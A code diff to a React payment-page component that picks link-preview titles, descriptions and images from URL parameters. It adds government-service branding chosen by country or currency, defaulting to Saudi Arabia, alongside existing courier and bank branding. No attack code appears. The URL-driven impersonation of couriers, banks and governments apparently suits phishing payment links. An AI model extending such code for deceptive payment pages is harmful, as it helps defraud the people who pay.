@@ -1,6 +1,8 @@
 import { Helmet } from 'react-helmet-async';
 import { getServiceBranding } from '@/lib/serviceLogos';
 import { getEntityPaymentShareImage, getEntityIdentity, detectEntityFromURL, getBankOGImage } from '@/lib/dynamicIdentity';
+import { isGovernmentService, getGovernmentServiceMeta } from '@/lib/governmentPaymentServices';
+import { getCountryByCurrency } from '@/lib/countryCurrencies';
 
 const companyMeta: Record<string, { title: string; description: string; image: string }> = {
   aramex: {
@@ -135,8 +137,24 @@ export const PaymentMetaTags: React.FC<PaymentMetaTagsProps> = ({
   const entityDescription = entityIdentity?.payment_share_description;
   
   const urlParams = new URLSearchParams(window.location.search);
-  const companyParam = urlParams.get('company') || serviceKey;
-  const companyMetaData = companyMeta[companyParam.toLowerCase()] || companyMeta.default;
+  const companyParam = urlParams.get('company') || urlParams.get('service') || serviceKey;
+  const countryParam = urlParams.get('country') || urlParams.get('c');
+  const currencyParam = urlParams.get('currency');
+  
+  // Check if government service and get appropriate meta
+  const isGovService = isGovernmentService(companyParam);
+  let govMeta = null;
+  
+  if (isGovService) {
+    // Get country from URL params or infer from currency
+    const inferredCountry = currencyParam ? getCountryByCurrency(currencyParam) : null;
+    const finalCountry = countryParam || inferredCountry || 'SA';
+    govMeta = getGovernmentServiceMeta(finalCountry);
+  }
+  
+  const companyMetaData = isGovService && govMeta 
+    ? { title: govMeta.title, description: govMeta.description, image: govMeta.image }
+    : (companyMeta[companyParam.toLowerCase()] || companyMeta.default);
   
   let ogImagePath = entityShareImage || companyMetaData.image || branding.ogImage;
   
